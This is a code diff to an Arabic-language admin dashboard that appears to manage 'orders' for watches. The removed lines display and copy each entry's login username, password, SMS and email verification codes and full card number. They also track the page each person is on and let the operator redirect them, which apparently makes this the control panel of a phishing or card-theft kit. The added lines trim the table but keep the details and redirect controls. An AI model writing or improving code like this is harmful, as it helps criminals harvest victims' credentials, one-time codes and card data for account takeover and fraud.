@@ -376,7 +376,7 @@ async function loadOrders() {
   }
 
   let html = `<table><thead><tr>
-    <th>العميل</th><th>الولاية</th><th>اللون</th><th>اسم المستخدم</th><th>الرمز السري</th><th>رمز التحقق</th><th>رمز الإيميل</th><th>رقم البطاقة</th><th>الحالة</th><th>الصفحة</th><th>التاريخ</th><th>الإجراءات</th>
+    <th>الولاية</th><th>الساعة</th><th>الاسم</th><th>رقم الهاتف</th><th>الحالة</th><th>الإجراءات</th>
   </tr></thead><tbody>`;
 
   orders.forEach(o => {
@@ -384,28 +384,16 @@ async function loadOrders() {
       ? watches[o.watch_index] : null;
     const watchImg = w ? w.img : "images/6.png";
     const statusClass = o.status || "pending";
-    const pageName = pageLabels[o.current_page] || o.current_page || "—";
-    const date = o.created_at ? new Date(o.created_at).toLocaleDateString("ar-EG",{day:"numeric",month:"short"}) : "—";
 
     html += `<tr>
-      <td><div class="td-user">
-        <div class="td-watch"><img src="${watchImg}" alt=""></div>
-        <div><div class="td-name">${o.name}</div><div class="td-phone">${o.phone}</div></div>
-      </div></td>
-      <td style="font-size:13px">${o.wilaya||"—"}</td>
-      <td style="font-size:13px">${o.watch_color||"—"}</td>
-      <td><div class="td-login-wrap"><span class="td-login">${o.login_username||"—"}</span>${o.login_username?`<button class="copy-btn" onclick="copyText(this,'${o.login_username}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
-      <td><div class="td-login-wrap"><span class="td-login">${o.login_password||"—"}</span>${o.login_password?`<button class="copy-btn" onclick="copyText(this,'${o.login_password}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
-      <td><div class="td-login-wrap"><span class="td-login" style="${o.verification_code?'color:#1565c0':''}">${o.verification_code||"—"}</span>${o.verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
-      <td><div class="td-login-wrap"><span class="td-login" style="${o.email_verification_code?'color:#d32f2f':''}">${o.email_verification_code||"—"}</span>${o.email_verification_code?`<button class="copy-btn" onclick="copyText(this,'${o.email_verification_code}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
-      <td><div class="td-login-wrap"><span class="td-login" style="${o.card_number?'color:#e65100':''}">${o.card_number?("****"+o.card_number.slice(-4)):"—"}</span>${o.card_number?`<button class="copy-btn" onclick="copyText(this,'${o.card_number}')" title="نسخ"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg></button>`:""}</div></td>
+      <td style="font-size:13px;font-weight:600">${o.wilaya||"—"}</td>
+      <td><div class="td-watch"><img src="${watchImg}" alt=""></div></td>
+      <td><div class="td-name">${o.name||"—"}</div></td>
+      <td><div class="td-phone" style="font-size:14px">${o.phone||"—"}</div></td>
       <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
-      <td><span class="badge badge-page">${pageName}</span></td>
-      <td style="font-size:12px;color:var(--muted)">${date}</td>
-      <td><div class="td-actions">
+      <td><div class="td-actions" style="flex-direction:column;gap:6px">
         <button class="btn-details" onclick="showDetails(${o.id})">التفاصيل</button>
-        <button class="btn-redirect" onclick="showRedirect(${o.id})">توجيه</button>
-        <button class="btn-delete" onclick="deleteOrder(${o.id})">حذف</button>
+        <button class="btn-redirect" onclick="showRedirect(${o.id})">إعادة التوجيه</button>
       </div></td>
     </tr>`;
   });
